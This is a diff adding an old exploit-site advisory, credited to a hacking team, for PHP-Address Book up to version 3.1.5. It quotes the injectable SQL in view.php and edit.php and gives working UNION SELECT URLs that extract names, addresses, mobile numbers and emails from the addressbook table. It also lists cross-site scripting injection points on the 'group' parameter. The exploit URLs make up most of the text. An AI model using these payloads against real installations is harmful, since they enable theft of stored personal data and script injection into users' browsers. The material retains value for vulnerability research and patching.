@@ -1,0 +1,81 @@
+============================================================
+ PHP-Address Book (SQL/XSS) Multiple Remote Vulnerabilities
+============================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+AUTHOR : CWH Underground
+DATE   : 4 June 2008
+SITE   : www.citec.us
+
+
+#####################################################
+ APPLICATION : PHP-Address Book
+ VERSION     : <= 3.1.5
+ DOWNLOAD    : http://sourceforge.net/projects/php-addressbook
+#####################################################
+
+---SQL Injection Exploit---
+
+##############################################
+Vulnerable: view.php
+
+ 6:  if ($id) {
+ 7:
+ 8:  $sql = "SELECT * FROM $base_from_where AND $table.id=$id";
+ 9:   $result = mysql_query($sql, $db);
+10:   $r = mysql_fetch_array($result);
+11:
+12:   $resultsnumber = mysql_numrows($result);
+13: }
+
+###############################################
+
+Exploit:
+
+http://[target]/[path]/view.php?id=-1 union select 1,2,3,id,firstname,lastname,7,address,mobile,10,11,12,email,14 from addressbook/*
+
+
+##############################################
+Vulnerable: edit.php
+
+30: if(! $read_only)
+31:  {
+32:	$sql="SELECT * FROM $base_from_where AND $table.id=$id";
+33:	$result = mysql_query($sql);
+34:	$resultsnumber = mysql_numrows($result);
+
+###############################################
+
+Exploit:
+
+http://[target]/[path]/edit.php?id=-1 union select 1,2,3,id,firstname,lastname,7,address,mobile,10,11,12,email,14 from addressbook/*
+
+
+---Remote XSS Exploit---
+
+[+]/?group
+[+]/index.php
+
+
+Example:
+     
+http://[target]/[path]/?group=<XSS>
+http://[target]/[path]/index.php?group=<XSS>
+
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-04]
